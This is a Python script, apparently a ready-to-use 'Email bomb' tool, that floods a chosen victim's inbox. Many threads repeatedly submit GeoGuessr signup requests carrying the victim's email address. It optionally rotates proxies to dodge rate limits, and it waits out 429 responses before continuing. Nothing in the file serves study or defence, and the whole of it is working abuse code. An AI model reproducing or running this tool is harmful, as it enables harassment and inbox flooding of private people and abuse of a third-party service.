import sys, os
try:
    import requests
    import threading
    from colorama import Fore, init; init()
    from pystyle import Center
    import time
    import random
except ModuleNotFoundError:
    libs = [
        'colorama',
        'pystyle',
        'requests'
    ]
    for lib in libs:
        os.system(f'pip install {lib}')
    
    input('Installed all libs, please rerun')

class cmd:
    reset = Fore.RESET
    red = Fore.RED
    def banner():
        art = f'''{cmd.red}
                 .               
                 .               
                 .       :       
                 :      .        
        :..   :  : :  .          
           ..  ; :: .            
              ... .. :..         
             ::: :...            
         ::.:.:...;; .....       
      :..     .;.. :;     ..     
            . :. .  ;.           
             .: ;;: ;.           
            :; .BRRRV;           
               YB BMMMBR         
              ;BVIMMMMMt         
        .=YRBBBMMMMMMMB          
      =RMMMMMMMMMMMMMM;          
    ;BMMR=VMMMMMMMMMMMV.         
   tMMR::VMMMMMMMMMMMMMB:        
  tMMt ;BMMMMMMMMMMMMMMMB.       
 ;MMY ;MMMMMMMMMMMMMMMMMMV       
 XMB .BMMMMMMMMMMMMMMMMMMM:      
 BMI +MMMMMMMMMMMMMMMMMMMMi      
.MM= XMMMMMMMMMMMMMMMMMMMMY      
 BMt YMMMMMMMMMMMMMMMMMMMMi      
 VMB +MMMMMMMMMMMMMMMMMMMM:      
 ;MM+ BMMMMMMMMMMMMMMMMMMR       
  tMBVBMMMMMMMMMMMMMMMMMB.       
   tMMMMMMMMMMMMMMMMMMMB:        
    ;BMMMMMMMMMMMMMMMMY          
      +BMMMMMMMMMMMBY:           
        :+YRBBBRVt;
'''

        art = Center.XCenter(art)
        print(art)
    
    def cls():
        os.system('cls')
    
    def title(x: str):
        os.system(f'title {x}')
    
    def resize():
        os.system('mode con: cols=100 lines=40')

class get:
    def prx_file() -> list:
        with open('proxies.txt', 'r') as f:
            return [line.strip() for line in f if line.strip()]

class bomb:
    def send(email: str, proxies: list, useprx: bool = False):
        global sent
        sent = 0
        while True:
            proxy = random.choice(proxies) if useprx else None
            try:
                if useprx:
                    r = requests.post(
                        'https://www.geoguessr.com/api/v3/accounts/signup',
                        json={
                            "email": email,
                            "target": "/",
                            "password": "bombedbyr3ci"
                        },
                        proxies={
                            "http://": f"http://{proxy}", 
                            "https://": f"http://{proxy}"
                        },
                        timeout=10
                    )
                else:
                    r = requests.post(
                        'https://www.geoguessr.com/api/v3/accounts/signup',
                        json={
                            "email": email,
                            "target": "/",
                            "password": "bombedbyr3ci"
                        },
                        timeout=10
                    )
                if r.status_code in [200, 400]:
                    print(f'{cmd.red}Sent!{cmd.reset}')
                    sent += 1
                    cmd.title(f'Email bomb - made by r3ci - sent -> {sent}')
                elif r.status_code == 429:
                    print(f'{cmd.red}Rate Limited! (waiting 30s){cmd.reset}')
                    time.sleep(30)
                else:
                    print(f'{cmd.red}Failed! ({r.status_code}) ({r.text}){cmd.reset}')
            except requests.exceptions.ProxyError:
                print(f'{cmd.red}Proxy Error: Could not connect to the proxy {proxy}{cmd.reset}')
            except requests.exceptions.RequestException as e:
                print(f'{cmd.red}Request Exception: {e}{cmd.reset}')
            except Exception as e:
                print(f'{cmd.red}General Exception: {e}{cmd.reset}')


while True:
    cmd.cls()
    cmd.resize()
    cmd.title(f'Email bomb - made by r3ci')
    cmd.banner()
    print('\n\n')
    prx = input(f'{cmd.red}Use proxies? (y/n) ->{cmd.reset} ')
    if prx == 'y':
        useprx = True
        proxies = get.prx_file()
    else:
        useprx = False
        proxies = []
    email = input(f'{cmd.red}Email to bomb ->{cmd.reset} ')
    threads_ = int(input(f'{cmd.red}Threads ->{cmd.reset} '))
    print(f'{Fore.RED}Planting...')

    threads = []
    for _ in range(threads_):
        t = threading.Thread(target=bomb.send, args=(email, proxies, useprx ))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    
    input(f'{cmd.red}Finished the task!')